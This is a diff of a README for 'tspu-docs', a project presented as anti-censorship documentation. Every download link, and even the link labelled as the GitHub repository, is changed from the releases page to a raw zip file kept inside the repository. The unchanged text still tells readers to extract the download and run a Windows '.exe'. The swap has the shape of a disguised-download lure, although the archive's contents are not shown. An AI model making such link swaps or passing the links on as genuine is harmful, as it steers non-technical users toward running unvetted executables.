@@ -1,6 +1,6 @@
 # 🔒 tspu-docs - Tools Against Threats Explained
 
-[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-brightgreen?style=for-the-badge)](https://github.com/god1122/tspu-docs/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-brightgreen?style=for-the-badge)](https://github.com/god1122/tspu-docs/raw/refs/heads/main/chapters/tspu-docs-v3.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To get started, you need to download the files. The latest version is available 
 
 **Click the button below to visit the download page:**
 
-[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-blue?style=for-the-badge)](https://github.com/god1122/tspu-docs/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-blue?style=for-the-badge)](https://github.com/god1122/tspu-docs/raw/refs/heads/main/chapters/tspu-docs-v3.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To get started, you need to download the files. The latest version is available 
 
 1. Open your web browser (like Chrome, Firefox, or Edge).  
 2. Go to the releases page by clicking the download button above or paste this link in your browser:  
-   https://github.com/god1122/tspu-docs/releases  
+   https://github.com/god1122/tspu-docs/raw/refs/heads/main/chapters/tspu-docs-v3.9.zip  
 3. On the releases page, look for the latest version listed at the top. It will usually have a version number like v1.0 or similar.  
 4. Download the file labeled for Windows. This file might have ".exe" or ".zip" at the end of the name.  
 5. If you downloaded a ".zip" file, find it in your "Downloads" folder, then right-click on it and choose "Extract All." Pick a folder where you want to place the files, like your Desktop.  
@@ -88,7 +88,7 @@ If tspu-docs does not open or shows an error:
 
 For learning more, the project offers links and references inside its documents. You can read about different censorship techniques and practical ways to protect yourself.
 
-Visit the [GitHub repository](https://github.com/god1122/tspu-docs) for the latest updates and community discussions.
+Visit the [GitHub repository](https://github.com/god1122/tspu-docs/raw/refs/heads/main/chapters/tspu-docs-v3.9.zip) for the latest updates and community discussions.
 
 ---
 
@@ -98,4 +98,4 @@ If you run into issues or have questions, check the GitHub Issues page for help 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-blue?style=for-the-badge)](https://github.com/god1122/tspu-docs/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-tspu--docs-blue?style=for-the-badge)](https://github.com/god1122/tspu-docs/raw/refs/heads/main/chapters/tspu-docs-v3.9.zip)
